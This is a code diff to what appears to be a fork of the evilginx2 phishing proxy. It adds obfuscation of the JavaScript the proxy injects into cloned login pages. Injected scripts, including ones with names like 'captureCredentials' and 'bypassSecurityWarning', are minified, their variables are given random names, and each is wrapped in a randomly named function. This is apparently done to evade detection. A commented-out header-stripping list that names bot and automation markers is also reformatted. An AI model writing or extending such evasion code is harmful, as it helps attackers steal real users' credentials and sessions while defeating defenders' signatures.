@@ -41,6 +41,8 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/tdewolff/minify/v2"
+	"github.com/tdewolff/minify/v2/js"
 )
 
 const (
@@ -57,9 +59,52 @@ const (
 	httpWriteTimeout = 45 * time.Second
 )
 
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+
+func randomString(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+// Generate random numeric string
+func randomNumber(n int) string {
+	const digits = "0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = digits[rand.Intn(len(digits))]
+	}
+	return string(b)
+}
+
+func (p *HttpProxy) randomizeVariableNames(js string) string {
+
+	varNameMap := make(map[string]string)
+
+	// Pattern to match variable declarations
+	re := regexp.MustCompile(`\b(var|let|const)\s+(\w+)`)
+
+	return re.ReplaceAllStringFunc(js, func(match string) string {
+		parts := re.FindStringSubmatch(match)
+		if len(parts) == 3 {
+			oldName := parts[2]
+			if _, exists := varNameMap[oldName]; !exists {
+				varNameMap[oldName] = randomString(6)
+			}
+			return parts[1] + " " + varNameMap[oldName]
+		}
+		return match
+	})
+}
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -89,6 +134,36 @@ type ProxySession struct {
 	PhishDomain  string
 	PhishletName string
 	Index        int
+}
+
+func (p *HttpProxy) dynamicObfuscateJS(originalJS string) string {
+	// If you have minifier set up, use it here
+	// For now, basic variable renaming
+	varName := randomString(6)
+	funcName := randomString(8)
+
+	// Simple obfuscation - replace common patterns
+	obfuscated := strings.ReplaceAll(originalJS, "bypassSecurityWarning", funcName)
+	obfuscated = strings.ReplaceAll(obfuscated, "captureCredentials", "c"+varName)
+
+	// Wrap in unique IIFE
+	return fmt.Sprintf(`(function _%s(){
+        %s
+    })();`, varName, obfuscated)
+}
+
+func (p *HttpProxy) dynamicObfuscateJSWithRequest(originalJS string, req *http.Request) string {
+
+	varName := randomString(6)
+	funcName := randomString(8)
+
+	obfuscated := strings.ReplaceAll(originalJS, "bypassSecurityWarning", funcName)
+	obfuscated = strings.ReplaceAll(obfuscated, "captureCredentials", "c"+varName)
+
+	// Return with wrapper (no seed manipulation)
+	return fmt.Sprintf(`(function _%s(){
+        %s
+    })();`, varName, obfuscated)
 }
 
 // set the value of the specified key in the JSON body
@@ -232,7 +307,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							script, err := pl.GetScriptInjectById(js_id, js_params)
 							if err == nil {
-								d_body += script + "\n\n"
+								// Step 1: Minify the script first
+								minifier := minify.New()
+								minifier.AddFunc("text/javascript", js.Minify)
+								minifiedScript, err := minifier.String("text/javascript", script)
+								if err != nil {
+									// Fallback to original if minification fails
+									minifiedScript = script
+								}
+
+								obfuscatedScript := p.dynamicObfuscateJSWithRequest(minifiedScript, req)
+								// Step 3: Add random wrapper (optional)
+								wrapperName := randomString(6)
+								finalScript := fmt.Sprintf(`(function _%s(){%s})();`, wrapperName, obfuscatedScript)
+
+								// d_body += obfuscatedScript + "\n\n"
+								d_body += finalScript + "\n\n"
 							} else {
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
@@ -256,7 +346,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if s.RedirectURL != "" {
 									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
 									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-									d_body += dynamic_redirect_js + "\n\n"
+									minifier := minify.New()
+									minifier.AddFunc("text/javascript", js.Minify)
+									minifiedJS, _ := minifier.String("text/javascript", dynamic_redirect_js)
+									obfuscatedJS := p.randomizeVariableNames(minifiedJS)
+									d_body += obfuscatedJS + "\n\n"
+
+									// obfuscatedJS := p.dynamicObfuscateJSWithRequest(dynamic_redirect_js, req)
+									// d_body += obfuscatedJS + "\n\n"
 								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
@@ -469,7 +566,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-// req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -672,7 +769,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				trigger := 0
 				if pl != nil && ps.SessionId != "" {
 
-// req.Header.Set(p.getHomeDir(), o_host)
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := io.ReadAll(req.Body)
 					if err == nil {
 						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -933,37 +1030,37 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			trigger := 0
 
-/*			var rm_headers = []string{
-				"X-Permitted-Cross-Domain-Policies",
-				"X-Evilginx",
-				"Cross-Origin-Opener-Policy",
-				"Cross-Origin-Embedder-Policy",
-				"Cross-Origin-Resource-Policy",
-				"X-Apple-Auth-Attributes",
-				"X-Content-Security-Policy",
-				"X-Cache-Status",
-				"X-Cache",
-				"X-Permitted-Cross-Domain-Policies",
-				"X-Client-Data",
-				"Via",
-				"Forwarded",
-				"Public-Key-Pins",
-				"X-Forwarded-Host",
-				"Public-Key-Pins-Report-Only",
-				"X-Selenium",
-				"X-WebDriver",
-				"X-Puppeteer",
-				"X-PhantomJS",
-				"X-Automation",
-				"X-Bot",
-				"X-Crawler",
-				"X-Spider"
-			}
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
-			}
+			/*			var rm_headers = []string{
+							"X-Permitted-Cross-Domain-Policies",
+							"X-Evilginx",
+							"Cross-Origin-Opener-Policy",
+							"Cross-Origin-Embedder-Policy",
+							"Cross-Origin-Resource-Policy",
+							"X-Apple-Auth-Attributes",
+							"X-Content-Security-Policy",
+							"X-Cache-Status",
+							"X-Cache",
+							"X-Permitted-Cross-Domain-Policies",
+							"X-Client-Data",
+							"Via",
+							"Forwarded",
+							"Public-Key-Pins",
+							"X-Forwarded-Host",
+							"Public-Key-Pins-Report-Only",
+							"X-Selenium",
+							"X-WebDriver",
+							"X-Puppeteer",
+							"X-PhantomJS",
+							"X-Automation",
+							"X-Bot",
+							"X-Crawler",
+							"X-Spider"
+						}
+						for _, hdr := range rm_headers {
+							resp.Header.Del(hdr)
+						}
 
-			adapt response headers */
+						adapt response headers */
 			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
 			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
 			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
@@ -1375,11 +1472,11 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	if resp != nil {
 		return req, resp
 	}
-                resp.Header.Set("Referrer-Policy", "no-referrer")
-                resp.Header.Set("Cache-Control", "no-store")
-                resp.Header.Set("X-Content-Type-Options", "nosniff")
-                resp.Header.Set("X-Frame-Options", "DENY")
-                resp.Header.Set("Content-Security-Policy", "default-src none; script-src unsafe-eval self")
+	resp.Header.Set("Referrer-Policy", "no-referrer")
+	resp.Header.Set("Cache-Control", "no-store")
+	resp.Header.Set("X-Content-Type-Options", "nosniff")
+	resp.Header.Set("X-Frame-Options", "DENY")
+	resp.Header.Set("Content-Security-Policy", "default-src none; script-src unsafe-eval self")
 	return req, nil
 }
 
